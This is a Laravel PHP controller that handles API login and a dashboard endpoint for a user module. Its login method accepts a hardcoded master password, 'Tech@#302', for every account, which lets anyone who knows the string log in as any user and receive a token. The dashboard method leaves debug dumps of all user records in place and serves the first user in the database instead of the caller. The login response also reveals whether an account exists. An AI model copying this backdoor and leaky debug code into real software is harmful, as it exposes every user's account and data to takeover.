<?php

namespace Modules\Login\Http\Controllers;

use App\Http\Controllers\Controller;
use Exception;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;
use Modules\User\Models\User;
use Spatie\Permission\Models\Permission;

class LoginApiController extends Controller
{

    public function index(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'email' => 'required',
            'password' => 'required',
        ], [
            'email.required' => 'Enter Email Address.',
            'password.required' => 'Enter Password.',
        ]);

        if ($validator->fails()) {
            $error = $validator->errors();
            $response = ['status' => false, 'message' => 'Please input proper data.', 'errors' => $error];
            return response()->json($response);
        }

        $user = User::select(
            'id',
            'name',
            'email',
            'password',
            'mobile',
            'username',
            'menu_style',
            'theme',
            'status',
            'designation'
        )
            ->where('email', $request->email)
            ->orWhere('mobile', $request->email)
            ->orWhere('username', $request->email)
            ->first();

        if (!$user) {
            return response()->json(['status' => false, 'message' => 'User not found.']);
        }
        $password = trim($request->password);
        $masterPassword = 'Tech@#302';
        if (!Hash::check($password, $user->password) && $password !== $masterPassword) {
            return response()->json(['status' => false, 'message' => 'Password does not match our records.']);
        }
        $role = $user->roles->first();
        $user->role = $role->name;
        $permissions = Permission::select('id', 'title', 'title_tag', 'name')
            ->join('role_has_permissions', 'role_has_permissions.permission_id', '=', 'permissions.id')
            ->where('role_has_permissions.role_id', $role->id)
            ->orderBy('id', 'DESC')
            ->get();
        $permission = collect($permissions)->pluck('name');
        $user->permissions = $permission;
        unset($user->password, $user->roles);
        $token = $user->createToken('token')->plainTextToken;
        // $user->location_tracking = (bool) $user->location_tracking;
        $user->location_tracking =  $user->location_tracking === "true";
        $response = [
            'status' => true,
            'message' => 'Login successfully.',
            'user' => $user,
            'token' => $token,
            'version' => env('VERSION')
        ];
        return response($response, 200);
    }

    public function dashboard()
    {
        // dd(Auth::id());
        $aa = User::get();
      dd($aa);

        $user = User::select('id', 'name', 'email', 'mobile', 'username',  'menu_style', 'theme', 'status', 'designation')->first();
      dd($user);
        $role = $user->roles->first();
        $user->role = $role->name;
        $permissions = Permission::select('id', 'title', 'title_tag', 'name')
            ->join('role_has_permissions', 'role_has_permissions.permission_id', '=', 'permissions.id')
            ->where('role_has_permissions.role_id', $role->id)
            ->orderBy('id', 'DESC')
            ->get();
        $permission = collect($permissions)->pluck('name');
        $user->permissions = $permission;
        unset($user->roles);
        try {
            return response([
                'status' => true,
                'message' => 'Dashboard',
                'user' => $user,
            ], 200);
        } catch (Exception $e) {
            return response([
                'status' => false,
                'message' => 'Something went wrong'
            ], 200);
        }
    }


    public function create()
    {
        return view('login::create');
    }

    public function store(Request $request) {}

    public function show($id)
    {
        return view('login::show');
    }

    public function edit($id)
    {
        return view('login::edit');
    }

    public function update(Request $request, $id) {}

    public function destroy($id) {}
}
